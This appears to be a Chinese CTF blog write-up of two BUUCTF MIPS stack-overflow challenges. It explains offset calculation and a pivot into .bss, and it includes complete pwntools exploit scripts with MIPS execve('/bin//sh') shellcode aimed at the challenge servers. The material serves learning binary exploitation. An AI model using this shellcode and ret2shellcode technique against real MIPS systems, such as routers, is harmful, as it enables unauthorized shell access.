---
title: mips练习
tags:
	- mips
	- pwn
categories:
	- 做题笔记
cover: /img/紫发.png
---
# mips-题目练习

## 前言 

上次学mips的时候就打算在buuctf上写两道题目看看效果，巩固一下。但是当天buuctf不知道怎么回事，g掉了。写不了题目了，直到现在，才有时间写这两道题目。

这两道题目应该也是非常经典了，网上有很多对这个的分析，题解。mips的前置知识呢写在了其他博客里面，在这里就啰嗦了。直接上题目。

## axb_2019_mips

这是一道`ret2shellcode` 的题目，非常的经典. 因为mips架构,不会开启NX 和 ASLR,所以我们可以往栈上,写shellcode,栈地址空间每次也都是一样的.所以非常好绕,不用泄露信息什么的.

但是,因为远程环境和本地环境的区别,远程和本地的地址空间不一定一样.所以远程还是不能直接这么打.继续看题

### ida分析

![mian函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152019651.png)

非常简单的程序,没有什么利用点,看`vuln()`

![vuln函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152120201.png)

发现溢出漏洞了，可以修改返回地址，但是要看汇编确定`$ra`的位置。

![vuln函数汇编](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152621302.png)

说真的，有的时候看汇编比看伪代码好。通过这个代码段，我们也可以了解到mips架构调用函数的一个流程。

进入之后，先把`$sp`往上移动0x40,然后分别把`$ra`和`$fp`放在`$sp+0x3c`和`$sp+0x38` 的位置.

在read时,会往`$sp+0x18`的位置读入0x200字节.所以输入`0x20`字节数据后就可以覆盖`$fp`和`$ra`.

### 思路分析

1. 之前说过可以直接写shellcode在栈上,然后把返回地址设置成栈上的地址就可以了,这个在本地完全可以这么打,但是远程的栈地址和本地会不一样,也不要想着爆破.
2. 所以,我们转换思路,通过返回到read 函数,把shellcode 写到bss段上,在返回到bss段上执行,也是非常简便的方法.
3. 如何控制read 的buf呢?在`0x40080c`的位置,有两条指令,分别是从栈上取出保存的`$fp`和`$ra`,那么只要我们覆盖到这里,就可以控制,取出来之后的这两个寄存器. 同时注意到read 是通过`$fp`来计算buf 的,所以控制了`$fp`,就控制了buf.
4. 那么如何控制程序跳转到shllcode呢?或者说,第二次的返回地址应该写在哪呢?因为`$fp`和`$ra`都是通过`$sp`寻找的,所以要特别关注`$sp`的变化,发现在read的结束之后又一条指令`move $sp, $fp` ,这会是`$sp`移到`$fp`的位置,所以第二次的返回地址,写在第二次的payload里,计算好偏移即可.

### exp

```python
from esy import *
context.log_level="debug"
context.arch="mips"
#io=process(["qemu-mipsel","-L","/home/tsq/Desktop/iot/DIR-815/_DIR-815.bin.extracted/squashfs-root/","-g","1234","./pwn"])
io=remote("node5.buuoj.cn",26700)

name="a"*0x14
payload=b"a"*0x20+p32(0x00410B80+0x18)+p32(0x004007E0)
shellcode=asm('''
addiu $sp, -0x40
li $t7, 0x69622f2f
sw $t7, -12($sp)
li $t6, 0x68732f6e
sw $t6, -8($sp)
sw $zero, -4($sp)
la $a0, -12($sp)
li $v0, 4011
move $a1, $zero
move $a2, $zero
syscall
nop
''')

print(len(shellcode))

io.sendafter("name: \n",name)
sleep(3)
io.send(payload)
payload=b"a"*0x24+p32(0x00410Bb0+0x28)+shellcode
io.send(payload)

io.interactive()

```

## ycb_2020_mipspwn

一回生,二回熟.再次看到同样,或者类似的read就非常得心应手

### ida分析

![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164722957.png)

表面上是一个菜单,实际上核心只有description ,直接点进去看

![description](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164826325.png)

继续

![vul汇编](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164919324.png)

直接看汇编,除了偏移不一样,没有任何变化.和上一道题完全一样的方法

### 思路分析

1. 那我们想如何快速的计算出偏移呢?首先要确定fp 和 ra 的偏移,分别是0x50 和 0x54, 直接可以出来.然后是buf 的偏移,0x18.可以通过ida 反汇编看出来.
2. 所以要写0x38的垃圾数据.所以如果都用0x50+var_xxx这种形式,直接看buf,这里xxx是多少,就是写多少垃圾数据.非常快速的找到偏移.
3. 第二次shellcode 的偏移 也很好找.假设你第一次payload 设置的fp 是 bss_addr.那么第二次返回地址就是`p32(bss_add+0x18+0x40)`
4. 0x18 是, read时 的偏移. 0x40 是,前面的垃圾数据,假设这个地址本身的长度.因为我们都会把shellcode 写在这个地址的后面.

### exp

```python
from esy import *
context.log_level="debug"
context.arch="mips"
#io=process(["qemu-mipsel","-g","1234","./pwn"])
io=remote("node5.buuoj.cn",26779)

def menu(op):
	io.sendlineafter("choice: ",str(op))
bss=0x004115F0
name=b"a"*4
payload=b"a"*0x38+p32(bss+0x10)+p32(0x00400F50)
shellcode=asm('''
addiu $sp, -0x40
li $t7, 0x69622f2f
sw $t7, -12($sp)
li $t6, 0x68732f6e
sw $t6, -8($sp)
sw $zero, -4($sp)
la $a0, -12($sp)
li $v0, 4011
move $a1, $zero
move $a2, $zero
syscall
nop
''')

io.sendafter("here:\n",name)
menu(7)
io.sendafter("feeling:",payload)


payload=b"a"*0x3c+p32(bss+0x10+0x18+0x40)+shellcode
io.send(payload)

io.interactive()

```

## 后记

写两道题,对mips下的程序的一个调用一下就开朗了.对shellcode ,寄存器的运用也提高了,还是收获不小.这两道题上手也是非常的快. 

不过第一道题似乎需要uClibc,我是之前分析DIR-815固件时,binwalk提取出来这个libc ,我就直接用了.

第二道题直接给了uClibc,可以直接写.